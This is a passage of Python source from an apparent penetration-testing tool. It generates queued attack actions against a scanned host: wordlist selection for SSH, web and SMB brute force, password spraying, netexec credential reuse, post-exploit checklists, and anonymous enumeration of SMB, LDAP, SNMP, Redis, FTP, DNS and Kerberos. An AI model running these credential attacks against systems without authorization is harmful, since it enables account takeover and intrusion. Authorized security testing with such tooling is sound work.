# ----- Wordlist policy -----------------------------------------------

# Each context maps to an ordered list of candidate paths. First-existing
# wins. Operators override per-context via settings keys
# (`wordlist_ssh-ctf`, `wordlist_web`, ...) or globally via
# `password_list` (the legacy setting; takes precedence over context
# defaults but not per-context overrides).
WORDLIST_SETS: Dict[str, Tuple[str, ...]] = {
    # Cheap+broad — for CTF / lab targets where the password is "in the
    # top-1000" and there's no real lockout policy.
    "ssh-ctf": (
        "/opt/homebrew/share/seclists/Passwords/Common-Credentials/"
        "10-million-password-list-top-1000.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/"
        "10-million-password-list-top-1000.txt",
        "/opt/homebrew/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt",
    ),
    # Tight — for production-shaped targets where every attempt that
    # hits a real account ticks toward lockout. 110 passwords is tuned
    # for "spray once before someone notices".
    "ssh-prod": (
        "/opt/homebrew/share/seclists/Passwords/Common-Credentials/"
        "best110.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/"
        "best110.txt",
        "/opt/homebrew/share/seclists/Passwords/Common-Credentials/"
        "10-million-password-list-top-100.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/"
        "10-million-password-list-top-100.txt",
    ),
    # Web login forms — common-web-passwords.txt and friends. Optimized
    # for "passwords that satisfy a web app's policy" (length, digits).
    "web": (
        "/opt/homebrew/share/seclists/Passwords/Common-Credentials/"
        "common-web-passwords.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/"
        "common-web-passwords.txt",
        "/opt/homebrew/share/seclists/Passwords/Common-Credentials/"
        "best110.txt",
    ),
    # SMB — extra-tight (15 entries) because lockout policies in AD are
    # aggressive and a misfire can lock a real domain account.
    "smb": (
        "/opt/homebrew/share/seclists/Passwords/Common-Credentials/"
        "best15.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/"
        "best15.txt",
        "/opt/homebrew/share/seclists/Passwords/Common-Credentials/"
        "best110.txt",
    ),
}


def _looks_ctf_target(state: ScanState) -> bool:
    """Heuristic: is this a CTF / lab / home-lab target?

    Used to route SSH brute to ssh-ctf (broad wordlist) vs ssh-prod
    (tight list with lockout-awareness). The signal is intentionally
    permissive — operators on internal pentests with RFC1918 targets
    will get the larger wordlist, which is right for them too.
    """
    if state.target_type in ("ip", "cidr"):
        return True
    target_lower = (state.target or "").lower()
    if any(d in target_lower for d in (
        ".thm", ".htb", "tryhackme", "hackthebox", "vulnhub",
        ".lab", ".test", ".local",
    )):
        return True
    if state.ip_addresses:
        first_ip = state.ip_addresses[0]
        if is_rfc1918(first_ip):
            return True
    return False


def select_wordlist(
    context: str, settings: Optional[dict], state: ScanState,
) -> str:
    """Pick a wordlist appropriate for `context`.

    Resolution order:
      1. Per-context override (`settings['wordlist_<context>']`)
      2. Legacy global override (`settings['password_list']`)
      3. WORDLIST_SETS entry for the context (first-existing)
      4. Cross-context fallback (any wordlist anywhere) — last resort.

    Special: `context == "ssh"` routes to ssh-ctf or ssh-prod via
    `_looks_ctf_target(state)`.
    """
    settings = settings or {}
    actual_ctx = context
    if context == "ssh":
        actual_ctx = "ssh-ctf" if _looks_ctf_target(state) else "ssh-prod"

    # 1. Per-context override
    keyed = settings.get(f"wordlist_{actual_ctx}") or settings.get(f"wordlist_{context}")
    if keyed and os.path.exists(keyed):
        return keyed
    # 2. Legacy global
    legacy = settings.get("password_list")
    if legacy and os.path.exists(legacy):
        return legacy
    # 3. Context defaults
    for path in WORDLIST_SETS.get(actual_ctx, ()):
        if os.path.exists(path):
            return path
    # 4. Cross-context fallback
    for ctx_paths in WORDLIST_SETS.values():
        for path in ctx_paths:
            if os.path.exists(path):
                return path
    return ""


# ----- Username collection -------------------------------------------

def _high_conf_usernames(state: ScanState, threshold: float = 0.6) -> List[str]:
    """Return usernames with confidence >= threshold, dedup case-insensitive.

    Falls back to email-local-parts from OSINT (always treated as 0.7).
    Backward-compatible with old-style `List[str]` entries (treats them
    as confidence 0.7 — they came from explicit user/email patterns).
    """
    seen: set = set()
    out: List[str] = []
    for u in state.discovered_usernames:
        if isinstance(u, str):
            name, conf = u, 0.7
        else:
            name, conf = u.username, u.confidence
        if conf < threshold:
            continue
        key = name.lower()
        if key in seen:
            continue
        seen.add(key)
        out.append(name)
    # OSINT email locals — always confident enough to brute.
    for src in (state.osint_emails, state.hunter_emails):
        for e in src:
            local = e.split(" ")[0].split("@")[0]
            if not local:
                continue
            if not re.match(r"^[A-Za-z][A-Za-z0-9._-]{1,31}$", local):
                continue
            key = local.lower()
            if key in seen:
                continue
            seen.add(key)
            out.append(local)
    return out


# ----- Credential-attack generator -----------------------------------

def _generate_credential_attacks(
    state: ScanState, settings: Optional[dict],
) -> List[EngagementAction]:
    """Cross-product: discovered usernames × open auth services.

    Walks `SERVICE_MATRIX` and emits one action per (entry, host) where
    the port is open and any gate predicate passes. Wordlist resolution
    is context-aware; missing wordlists silently skip the entry rather
    than emitting an unrunnable card.
    """
    out: List[EngagementAction] = []
    primary_host = _primary_host(state)
    if not primary_host:
        return out
    users = _high_conf_usernames(state)
    if not users:
        return out
    open_ports = {p.port for p in state.open_ports}
    users_file = _materialize_users_file(state, users)
    domain = _domain_for_target(state) or ""

    for entry in SERVICE_MATRIX:
        if entry.port not in open_ports:
            continue
        # Gate: skip if the named ScanState attr exists and is not True.
        # Empty gate = always allowed.
        if entry.gate_field:
            if getattr(state, entry.gate_field, None) is not True:
                continue
        wordlist = select_wordlist(entry.wordlist_context, settings, state)
        if not wordlist:
            continue
        cmd = [
            arg.format(
                host=primary_host, port=entry.port,
                users_file=users_file, wordlist=wordlist,
                domain=domain,
            )
            for arg in entry.cmd_template
        ]
        out.append(EngagementAction(
            name=f"{entry.name.upper()} credential brute force",
            description=(
                f"{entry.tool} against {primary_host}:{entry.port} — "
                f"{len(users)} username(s) × wordlist "
                f"({os.path.basename(wordlist)})"
            ),
            command=cmd,
            risk=entry.risk,
            expected_output=(
                f"On hit: credential pair printed by {entry.tool}. "
                "Failures are silent or per-attempt rejection."
            ),
            required_tool=entry.tool,
            rationale=entry.rationale,
            finding_ref=(
                f"open {entry.name}({entry.port}) + {len(users)} users"
            ),
        ))
    return out


# ----- Tech-driven exploit generator ---------------------------------

def _generate_tech_exploits(
    state: ScanState, settings: Optional[dict],
) -> List[EngagementAction]:
    """Walk TECH_EXPLOITS, emit actions where the tech is fingerprinted.

    Iterates over every detected web URL so that, e.g., Tomcat detected
    on 8080 doesn't get a card pointing at port 80. Dedup is on
    `(name, full_command)` so the same `web_url` doesn't produce two
    identical cards across passes.

    Match sources:
      - `state.technologies` (whatweb / wappalyzer)
      - fetched-file content (`f.detail` for every Phase-2 finding)
      - structural signals: 'git-exposed' triggers on state.git_exposed_url
    """
    techs_blob = " ".join(state.technologies).lower()
    file_text = " ".join(
        f.detail or "" for f in state.findings_phase2
    ).lower()
    web_urls = _all_web_urls(state)
    if not web_urls:
        web_urls = [""]    # let non-web actions still try to fire
    primary_host = _primary_host(state) or ""
    domain = _domain_for_target(state) or ""
    git_url = (state.git_exposed_url or "").rstrip("/")

    out: List[EngagementAction] = []
    seen_keys: set = set()

    for tech, exploits in TECH_EXPLOITS.items():
        # Trigger logic
        if tech == "git-exposed":
            if not git_url:
                continue
        elif tech not in techs_blob and tech not in file_text:
            continue
        for ex in exploits:
            # Iterate per web URL so multi-port targets get coverage
            # on each. Non-web exploits (no `{web_url}` in cmd) get
            # de-duped by (name, cmd) so they only emit once.
            for web_url in web_urls:
                if ex.needs == "web_url" and not web_url:
                    continue
                if ex.needs == "git_exposed" and not git_url:
                    continue
                try:
                    cmd = [
                        arg.format(
                            host=primary_host, web_url=web_url,
                            git_url=git_url, domain=domain,
                        )
                        for arg in ex.command
                    ]
                except (KeyError, IndexError):
                    continue
                try:
                    rationale = ex.rationale.format(
                        host=primary_host, web_url=web_url,
                        git_url=git_url, domain=domain,
                    )
                except (KeyError, IndexError):
                    rationale = ex.rationale
                key = (ex.name, tuple(cmd))
                if key in seen_keys:
                    continue
                seen_keys.add(key)
                # Tag the card name with the port when there's more
                # than one web URL — otherwise a Tomcat card on 80 and
                # one on 8080 are visually indistinguishable.
                display_name = ex.name
                if len(web_urls) > 1 and web_url and "{web_url}" in str(ex.command):
                    from urllib.parse import urlparse
                    port = urlparse(web_url).port
                    if port:
                        display_name = f"{ex.name} ({port})"
                out.append(EngagementAction(
                    name=display_name,
                    description=ex.description.format(
                        web_url=web_url, host=primary_host,
                        git_url=git_url, domain=domain,
                    ) if "{" in ex.description else ex.description,
                    command=cmd,
                    risk=ex.risk,
                    expected_output=ex.expected_output or "see rationale",
                    required_tool=ex.tool,
                    rationale=rationale,
                    finding_ref=(
                        f"tech: {tech}" + (f" @ {web_url}" if web_url else "")
                    ),
                    manual_only=ex.manual_only,
                ))
    return out


# ----- Post-exploit generator (OS-aware) -----------------------------

def _generate_post_exploit(
    state: ScanState, settings: Optional[dict],
) -> List[EngagementAction]:
    """OS-aware post-credential recon. Triggered only when creds confirmed.

    All entries are `manual_only=True` — they're meant to run inside
    the gained shell on the target, not via vulnscout's local
    subprocess. We surface them as a checklist with paste-ready commands.
    """
    if not state.confirmed_creds:
        return []
    os_kind = detect_os(state)
    if os_kind == "linux":
        templates = POST_EXPLOIT_LINUX
    elif os_kind == "windows":
        templates = POST_EXPLOIT_WINDOWS
    else:
        return []
    out: List[EngagementAction] = []
    for t in templates:
        out.append(EngagementAction(
            name=t.name,
            description=f"in the gained shell, run: {t.cmd_text}",
            command=["echo", f"manual: {t.cmd_text}"],
            risk=t.risk,
            expected_output="depends on the shell context — see rationale",
            required_tool="echo",
            rationale=t.rationale,
            finding_ref=f"post-exploit ({os_kind})",
            manual_only=True,
        ))
    return out


# ----- Credential reuse generator ------------------------------------

def _generate_credential_reuse(
    state: ScanState, settings: Optional[dict],
) -> List[EngagementAction]:
    """For each confirmed cred, try it against every other open auth service.

    Cheap, high-signal, almost free in lockout terms (one auth attempt
    per service per cred). Skips the originating service (already
    confirmed) and dedup by (user, service).
    """
    out: List[EngagementAction] = []
    if not state.confirmed_creds:
        return out
    primary_host = _primary_host(state)
    if not primary_host:
        return out
    open_ports = {p.port for p in state.open_ports}
    # netexec covers smb / mssql / ssh / winrm / ftp / ldap / rdp / vnc
    # uniformly via subcommand; map the matrix name → cme subcommand.
    cme_subcommand = {
        "smb": "smb", "smb-legacy": "smb", "ssh": "ssh",
        "winrm": "winrm", "mssql": "mssql", "ftp": "ftp",
        "rdp": "rdp", "vnc": "vnc",
    }
    seen: set = set()
    for user, password, src_service in state.confirmed_creds:
        for entry in SERVICE_MATRIX:
            sub = cme_subcommand.get(entry.name)
            if sub is None:
                continue
            if entry.name == src_service:
                continue
            if entry.port not in open_ports:
                continue
            key = (user.lower(), entry.name)
            if key in seen:
                continue
            seen.add(key)
            out.append(EngagementAction(
                name=f"Credential reuse — {user} on {entry.name}",
                description=(
                    f"netexec {sub} {primary_host} -u {user} -p <pw> "
                    f"— try {src_service} cred against {entry.name}"
                ),
                command=[
                    "netexec", sub, primary_host,
                    "-u", user, "-p", password,
                ],
                risk="MEDIUM",
                expected_output=(
                    "On hit: `[+] Pwn3d!` or service-specific success "
                    "marker. On miss: STATUS_LOGON_FAILURE / 401 / etc."
                ),
                required_tool="netexec",
                rationale=(
                    f"Users reuse credentials. {user!r} authenticated on "
                    f"{src_service}; same pair has a real chance against "
                    f"{entry.name} on the same host. One auth attempt "
                    "per service is much cheaper than a brute-force run."
                ),
                finding_ref=f"cred-reuse({user}: {src_service}→{entry.name})",
            ))
    return out


# ----------------------------------------------------------------------
# Queue builder
# ----------------------------------------------------------------------


def build_action_queue(
    state: ScanState, settings: Optional[dict] = None,
) -> List[EngagementAction]:
    """Construct the initial action queue from Phase 1+2 state.

    Two kinds of generators feed the queue:

      1. **Function-shaped recon helpers** (`_action_smb_null_list`,
         `_action_enum4linux`, ...) — port-specific one-shot probes
         where each tool has a bespoke command shape. Adding new
         coverage here is a new helper.

      2. **Table-driven generators** (`_generate_credential_attacks`,
         `_generate_tech_exploits`, `_generate_post_exploit`,
         `_generate_credential_reuse`) — declaratively driven by
         SERVICE_MATRIX / TECH_EXPLOITS / POST_EXPLOIT_*. Adding new
         coverage here is one row in a table.

    Pure assembly. Mutates state only via `_materialize_users_file`
    (registers users.txt for cleanup on Reset).
    """
    settings = settings or {}
    primary_host = _primary_host(state)
    web_url = _primary_web_url(state)
    user_list = _high_conf_usernames(state)
    open_port_set = {p.port for p in state.open_ports}

    actions: List[EngagementAction] = []

    # ---- network-recon tier (LOW; no creds, no payload) -----------------
    actions += _action_smb_null_list(primary_host, open_port_set)
    actions += _action_enum4linux(primary_host, open_port_set)
    actions += _action_nxc_smb_userenum(primary_host, open_port_set)
    actions += _action_nfs_showmount(primary_host, open_port_set)
    actions += _action_ldap_anon(primary_host, open_port_set)
    actions += _action_snmp(primary_host, open_port_set)
    actions += _action_redis(primary_host, open_port_set)
    actions += _action_ftp_anon(primary_host, open_port_set)
    actions += _action_dns_axfr(state, primary_host, open_port_set)
    actions += _action_ssh_auth_probe(primary_host, open_port_set, user_list)
    actions += _action_kerbrute(state, primary_host, open_port_set, user_list)
    actions += _action_vhost(state, web_url)
    actions += _action_subdomain_takeover(state)
    # Printer pwnage — IPP / raw-print / NSE fingerprint.
    actions += _action_printer_pwn(primary_host, open_port_set)
    # Internal-engagement-only / manual-only relay & poison hints.
    actions += _action_responder_hint(state, primary_host, open_port_set)
    actions += _action_ntlmrelayx_hint(state, primary_host, open_port_set)

    # ---- tech-driven exploit checks (LOW–HIGH) -------------------------
    # Single dispatch table covers gitleaks, struts, jenkins, tomcat,
    # phpmyadmin, grafana, gitlab, elasticsearch, jira, roundcube,
    # wordpress, etc. Adding a new platform is one TECH_EXPLOITS entry.
    actions += _generate_tech_exploits(state, settings)

    # ---- CVE-driven Metasploit modules (CRITICAL) + searchsploit -------
    # CVE → MSF cross-ref happens in Phase 2; here we just surface them.
    msf_covered = _msf_covered_cves(state)
    actions += _actions_msf_modules(state, primary_host)
    actions += _action_searchsploit_unmsf(state, msf_covered)
    # Per-hit searchsploit actions — covers exploits with no CVE in the
    # title that the unmsf-CVE pass would otherwise miss.
    actions += _generate_searchsploit_actions(state, msf_covered)

    # ---- credential-attack tier (MEDIUM–HIGH; SERVICE_MATRIX-driven) ---
    # Cross-product of usernames × open auth services. SSH brute is
    # gated on `state.ssh_password_auth_confirmed` (set by the SSH probe
    # follow-up) so it never queues against pubkey-only servers.
    actions += _action_asrep_roast(
        state, primary_host, open_port_set, user_list,
    )
    actions += _action_nxc_password_spray(
        state, primary_host, open_port_set, user_list,
    )
    actions += _generate_credential_attacks(state, settings)

    # ---- post-credential tier (MEDIUM–CRITICAL) ------------------------
    # All conditional on `state.confirmed_creds` being non-empty; the
    # initial queue for a fresh scan won't surface these.
    actions += _generate_credential_reuse(state, settings)
    actions += _generate_post_exploit(state, settings)
    actions += _actions_credflow(state, primary_host, open_port_set)
    # Modern AD post-cred follow-ups — only fire once a credential has
    # been confirmed (the gate is inside each helper).
    actions += _action_nxc_share_enum_with_creds(state, primary_host, open_port_set)
    actions += _action_smbmap_walk_with_creds(state, primary_host, open_port_set)
    actions += _action_evil_winrm_with_creds(state, primary_host, open_port_set)
    actions += _action_certipy_find(state, primary_host, open_port_set, user_list)
    actions += _action_bloodhound_collection(state, primary_host, open_port_set)

    # Sort by risk tier, stable within tier so the explicit ordering
    # above is preserved (recon before brute before cred-flow).
    actions.sort(key=lambda a: _RISK_SORT.get(a.risk, 99))
    return actions


# ----------------------------------------------------------------------
# Network-recon tier (LOW)
# ----------------------------------------------------------------------


def _action_smb_null_list(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """SMB null-session share listing.

    Trigger: 139 or 445 open, host resolved.
    Risk: LOW — null bind is read-only and most servers either allow it
    or refuse with NT_STATUS_ACCESS_DENIED. Either response is signal.
    """
    smb = next((p for p in (139, 445) if p in ports), 0)
    if not smb or not primary_host:
        return []
    return [EngagementAction(
        name="SMB share enumeration (null session)",
        description=(
            f"smbclient anonymous bind against {primary_host}:{smb} — "
            "list shares without credentials"
        ),
        command=["smbclient", "-L", f"//{primary_host}/", "-N"],
        risk="LOW",
        expected_output=(
            "smbclient prints the Sharename / Type / Comment table on "
            "success, or 'NT_STATUS_ACCESS_DENIED' if anonymous binds "
            "are blocked."
        ),
        required_tool="smbclient",
        rationale=(
            "An open SMB port plus an anonymous bind costs nothing to "
            "try and frequently surfaces public shares (IPC$, NETLOGON, "
            "occasionally a poorly-permissioned departmental share). "
            "The probe lands in audit logs but doesn't change anything."
        ),
        finding_ref=f"open smb({smb})",
    )]


def _action_enum4linux(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Full SMB enumeration via enum4linux-ng.

    Trigger: 139 or 445 open.
    Risk: LOW — enum4linux walks RPC/SMB endpoints with anonymous and
    guest credentials. No writes, no auth attempts beyond the standard
    null/guest pair.
    """
    smb = next((p for p in (139, 445) if p in ports), 0)
    if not smb or not primary_host:
        return []
    return [EngagementAction(
        name="SMB user/share enumeration (enum4linux-ng)",
        description=(
            f"enum4linux-ng -A {primary_host} — pulls users, groups, "
            "shares, password policy, and RID-cycle results"
        ),
        command=["enum4linux-ng", "-A", primary_host],
        risk="LOW",
        expected_output=(
            "Sectioned output: 'Users via RPC', 'Shares', 'Password "
            "Policy', 'Domain Information'. Empty sections mean the "
            "server refused that particular query."
        ),
        required_tool="enum4linux-ng",
        rationale=(
            "Asks the SMB server for a complete dump of users, groups, "
            "shares, and the password policy — the same way a Windows "
            "machine joining the domain asks. If the server is mis"
            "configured for anonymous access, this returns the entire "
            "user database. Non-disruptive, but lands in audit logs."
        ),
        finding_ref=f"open smb({smb})",
    )]


def _action_nfs_showmount(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """NFS export listing.

    Trigger: 2049/tcp open.
    Risk: LOW — `showmount -e` is a single read-only RPC.
    """
    if 2049 not in ports or not primary_host:
        return []
    return [EngagementAction(
        name="NFS share enumeration (showmount)",
        description=f"showmount -e {primary_host} — list NFS exports",
        command=["showmount", "-e", primary_host],
        risk="LOW",
        expected_output=(
            "Lists each exported directory and which clients are "
            "permitted to mount it (often `(everyone)` or a CIDR)."
        ),
        required_tool="showmount",
        rationale=(
            "Asks the NFS server which directories it exports and to "
            "which clients. Read-only RPC query. The actual `mount` is "
            "left as a manual follow-up because mount-point selection "
            "depends on what's interesting in the listing."
        ),
        finding_ref="open nfs(2049)",
    )]


def _action_ldap_anon(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Anonymous LDAP bind + base-DSE query.

    Trigger: 389/tcp or 636/tcp open.
    Risk: LOW — read-only, no credentials sent.
    """
    if not ({389, 636} & ports) or not primary_host:
        return []
    scheme = "ldaps" if 636 in ports and 389 not in ports else "ldap"
    return [EngagementAction(
        name="LDAP anonymous bind",
        description=(
            f"ldapsearch -x -H {scheme}://{primary_host} -s base "
            "namingcontexts — fetch directory layout without creds"
        ),
        command=[
            "ldapsearch", "-x", "-H", f"{scheme}://{primary_host}",
            "-s", "base", "namingcontexts",
        ],
        risk="LOW",
        expected_output=(
            "Returns the directory's naming contexts (e.g. "
            "`dc=example,dc=com`) on success, or `result: 32 No such "
            "object` / `result: 50 Insufficient access` when bind fails."
        ),
        required_tool="ldapsearch",
        rationale=(
            "Some directory servers permit unauthenticated reads of "
            "selected entries — typically the schema, but sometimes the "
            "entire user tree with attributes. This sends one bind and "
            "prints whatever comes back. Read-only; no writes possible "
            "without credentials."
        ),
        finding_ref="open ldap(389/636)",
    )]


def _action_snmp(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """SNMP community-string check via onesixtyone.

    Trigger: 161/tcp open (we don't reliably do UDP scans, so the
    trigger leans on TCP/161 which some agents also expose).
    Risk: LOW — single UDP packet per community guess; no auth lockout.
    """
    if 161 not in ports or not primary_host:
        return []
    return [EngagementAction(
        name="SNMP community-string check",
        description=(
            f"onesixtyone {primary_host} with the default top-50 "
            "community list (public, private, cisco, …)"
        ),
        command=["onesixtyone", primary_host],
        risk="LOW",
        expected_output=(
            "On a hit: `<host> [<community>] <sysDescr.0>`. Misses are "
            "silent. Single-line output per matched community."
        ),
        required_tool="onesixtyone",
        rationale=(
            "Tries common SNMP community strings. SNMPv1/v2c uses these "
            "as a password and many devices ship with unchanged "
            "defaults. A successful hit means snmpwalk can dump the "
            "device's entire config — frequently including admin "
            "passwords on routers and printers."
        ),
        finding_ref="open snmp(161)",
    )]


def _action_redis(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Redis unauthenticated probe.

    Trigger: 6379/tcp open.
    Risk: LOW — `INFO server` is read-only. The interesting follow-up
    (CONFIG SET write-key for RCE) is intentionally NOT queued; if the
    probe succeeds, the operator decides whether to escalate manually.
    """
    if 6379 not in ports or not primary_host:
        return []
    return [EngagementAction(
        name="Redis unauthenticated probe",
        description=(
            f"redis-cli -h {primary_host} -p 6379 INFO server — "
            "fingerprint the server without auth"
        ),
        command=[
            "redis-cli", "-h", primary_host, "-p", "6379", "INFO", "server",
        ],
        risk="LOW",
        expected_output=(
            "On success: a multi-line `# Server` block with redis_version, "
            "os, arch, tcp_port. On auth-protected: `(error) NOAUTH "
            "Authentication required.`"
        ),
        required_tool="redis-cli",
        rationale=(
            "Redis bound to a public IP without `requirepass` is a "
            "common misconfiguration. This sends a single INFO command "
            "— if the server answers, it's misconfigured. The dangerous "
            "follow-up (CONFIG SET dir / dbfilename to drop an SSH key) "
            "is left manual on purpose: it modifies the target's "
            "filesystem and there's no clean undo."
        ),
        finding_ref="open redis(6379)",
    )]


def _action_ftp_anon(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Anonymous FTP login probe.

    Trigger: 21/tcp open.
    Risk: LOW — single login attempt with documented anonymous account.
    """
    if 21 not in ports or not primary_host:
        return []
    # `curl` is the most portable way to script anonymous FTP across
    # macOS / Linux without an interactive `ftp` shell. -l lists the
    # directory; --connect-timeout caps a hung handshake.
    return [EngagementAction(
        name="FTP anonymous login + listing",
        description=(
            f"curl -s --connect-timeout 8 ftp://anonymous:anonymous@"
            f"{primary_host}/ — listing if anon allowed"
        ),
        command=[
            "curl", "-s", "--connect-timeout", "8",
            f"ftp://anonymous:anonymous@{primary_host}/",
        ],
        risk="LOW",
        expected_output=(
            "On anon-allowed: a directory listing (one entry per line). "
            "Otherwise: `curl: (67) Access denied` or 530 reply codes."
        ),
        required_tool="curl",
        rationale=(
            "Anonymous FTP is rare-but-real on legacy systems and "
            "occasionally on backup/upload portals. Single login as "
            "the documented `anonymous`/`anonymous` pair — no brute-"
            "force, no lockout. Read-only listing."
        ),
        finding_ref="open ftp(21)",
    )]


def _action_dns_axfr(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """DNS zone transfer attempt against an authoritative server.

    Trigger: 53/tcp open AND target is a domain (or has a domain we can
    derive). Skipped for IP-only targets — there's no zone to ask about.
    Risk: LOW — almost always denied, but when accepted it dumps the
    entire zone (internal hostnames, mail servers, dev infra, ...).
    """
    if 53 not in ports or not primary_host:
        return []
    domain = _domain_for_target(state)
    if not domain:
        return []
    return [EngagementAction(
        name="DNS zone transfer (AXFR)",
        description=(
            f"dig axfr @{primary_host} {domain} — request the entire "
            "zone in one query"
        ),
        command=["dig", "axfr", f"@{primary_host}", domain],
        risk="LOW",
        expected_output=(
            "On success: every A/AAAA/MX/NS/TXT/CNAME record in the "
            "zone. On the common refusal: `; Transfer failed.` or "
            "`Connection refused`."
        ),
        required_tool="dig",
        rationale=(
            "AXFR is the wire-protocol primitive for replicating a DNS "
            "zone between servers. Modern DNS deployments restrict it "
            "to known secondaries — but when the ACL is misconfigured, "
            "an unauthenticated request returns every record in the "
            "zone, exposing internal hostnames, dev/staging infra, and "
            "mail routing topology in one shot."
        ),
        finding_ref=f"dns(53) + domain({domain})",
    )]


def _action_ssh_auth_probe(
    primary_host: str, ports: set, user_list: List[str],
) -> List[EngagementAction]:
    """Probe which SSH auth methods the server accepts.

    Trigger: 22 open, at least one username known (we need a real user
    in the request — `root` is the universal default if we have nothing).
    Risk: LOW — one TCP handshake, no password attempt. Tells you
    whether SSH brute-force is even viable before queueing one.
    """
    if 22 not in ports or not primary_host:
        return []
    probe_user = user_list[0] if user_list else "root"
    return [EngagementAction(
        name="SSH auth-method probe",
        description=(
            f"ssh -o PreferredAuthentications=none -o BatchMode=yes "
            f"{probe_user}@{primary_host} — see what auth the server "
            "accepts"
        ),
        command=[
            "ssh",
            "-o", "PreferredAuthentications=none",
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=8",
            f"{probe_user}@{primary_host}",
        ],
        risk="LOW",
        expected_output=(
            "Server's auth refusal lists supported methods, e.g.: "
            "`Permission denied (publickey,password,keyboard-"
            "interactive)`. Pubkey-only servers (just `publickey`) "
            "ignore brute-force attempts entirely."
        ),
        required_tool="ssh",
        rationale=(
            "Sends one SSH handshake with no auth method offered; the "
            "server replies with the list of methods it accepts. If "
            "the list is `publickey` only, the SSH brute-force action "
            "is wasted noise (and lockout risk for nothing). Run this "
            "before queueing brute-force."
        ),
        finding_ref="open ssh(22)",
    )]


def _action_kerbrute(
    state: ScanState, primary_host: str, ports: set, user_list: List[str],
) -> List[EngagementAction]:
    """Kerberos username enumeration — no auth attempts.

    Trigger: 88/tcp open + a userlist + a derivable domain.
    Risk: LOW — kerbrute userenum doesn't try to authenticate, it just
    measures pre-auth response timing/codes to learn which users exist.
    """
    if 88 not in ports or not primary_host or not user_list:
        return []
    domain = _domain_for_target(state) or "DOMAIN.LOCAL"
    users_file = _materialize_users_file(state, user_list)
    return [EngagementAction(
        name="Kerberos user enumeration",
        description=(
            f"kerbrute userenum --dc {primary_host} -d {domain} "
            f"{users_file} — no auth attempts, just enum"
        ),
        command=[
            "kerbrute", "userenum",
            "--dc", primary_host,
            "-d", domain,
            users_file,
        ],
        risk="LOW",
        expected_output=(
            "Per-line: `[+] VALID USERNAME: alice@example.com`. "
            "Invalid names are silent (or `[!]` with --verbose)."
        ),
        required_tool="kerbrute",
        rationale=(
            "Active Directory leaks valid usernames via Kerberos "
            "pre-authentication response codes — the DC says 'no such "
            "user' faster than 'wrong password'. This sends one "
            "auth-less probe per name in the list. No login attempts "
            "are made, so account-lockout policies don't apply. "
            f"Domain guess is {domain!r} — edit the command if your "
            "realm differs."
        ),
        finding_ref=f"open kerberos(88) + {len(user_list)} usernames",
    )]


def _action_vhost(
    state: ScanState, web_url: str,
) -> List[EngagementAction]:
    """Virtual-host fuzzing — find web sites the public DNS doesn't reveal.

    Trigger: web URL known + we have a wordlist.
    Risk: LOW — one HTTP request per word with a fake Host: header.
    """
    if not web_url or state.target_type != "domain":
        return []
    domain = _domain_for_target(state)
    if not domain:
        return []
    # Reuse the directory wordlist if it's already on disk; vhost
    # wordlists are similar shape and the operator can edit if needed.
    wordlist = _common_wordlist()
    if not wordlist:
        return []
    return [EngagementAction(
        name="Virtual host fuzzing",
        description=(
            f"ffuf with Host: FUZZ.{domain} against {web_url} — "
            "discover vhost-routed sites the public DNS doesn't list"
        ),
        command=[
            "ffuf",
            "-u", web_url.rstrip("/") + "/",
            "-H", f"Host: FUZZ.{domain}",
            "-w", wordlist,
            "-mc", "200,301,302,401,403",
            "-fs", "0",
            "-t", "40",
            "-s",
        ],
        risk="LOW",
        expected_output=(
            "ffuf prints one line per Host: header that returned a "
            "different response than baseline. Empty output = the "
            "server treats every Host: header identically (no vhost "
            "routing)."
        ),
        required_tool="ffuf",
        rationale=(
            "Sends one HTTP request per word in the wordlist with a "
            "fake `Host:` header. If the server hosts multiple sites, "
            "you'll find ones the public DNS doesn't reveal — internal "
            "admin panels, dev environments, customer-specific portals."
        ),
        finding_ref=f"web target + domain({domain})",
    )]


def _action_subdomain_takeover(
    state: ScanState,
) -> List[EngagementAction]:
    """Subjack scan for dangling-CNAME subdomain takeovers.

    Trigger: state.subdomains non-empty.
    Risk: MEDIUM — read-only check, but a confirmed takeover lets the
    operator (or attacker) register the dangling resource.
    """
    if not state.subdomains:
        return []
    # Materialize the subdomain list as a temp file so subjack can
    # read it. Reuses the engagement_tmpfiles cleanup path.
    fd, path = tempfile.mkstemp(prefix="vulnscout-subs-", suffix=".txt")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(state.subdomains) + "\n")
    state.engagement_tmpfiles.append(path)
    return [EngagementAction(
        name="Subdomain takeover check (subjack)",
        description=(
            f"subjack -w {path} -ssl -v — check {len(state.subdomains)} "
            "subdomain(s) for dangling cloud-service CNAMEs"
        ),
        command=["subjack", "-w", path, "-ssl", "-v"],
        risk="MEDIUM",
        expected_output=(
            "On a hit: `[Vulnerable] subdomain.example.com (S3 Bucket)`. "
            "Misses are reported as `[Not Vulnerable]` with -v."
        ),
        required_tool="subjack",
        rationale=(
            "Checks each known subdomain to see if it points to a "
            "third-party service (S3 bucket, Heroku app, GitHub Pages, "
            "Azure site, ...) where the underlying resource has been "
            "deleted. If yes, an attacker can register the dangling "
            "resource and serve content under the legitimate domain — "
            "useful for phishing, cookie theft, or hijacking domain-"
            "validated certificates. Read-only check; the takeover "
            "itself is a separate manual step."
        ),
        finding_ref=f"{len(state.subdomains)} subdomain(s)",
    )]


# ----------------------------------------------------------------------
# CVE → Metasploit + searchsploit (kept; CVE-driven, not tech-name-driven)
# ----------------------------------------------------------------------


def _msf_covered_cves(state: ScanState) -> set:
    """Set of CVEs that have at least one MSF module suggested."""
    out = set()
    for cve, _mod in state.msf_modules:
        out.add(cve.upper())
    if "CVE-2020-1938" in {c.upper() for c in state.cve_findings}:
        out.add("CVE-2020-1938")
    return out


def _actions_msf_modules(
    state: ScanState, primary_host: str,
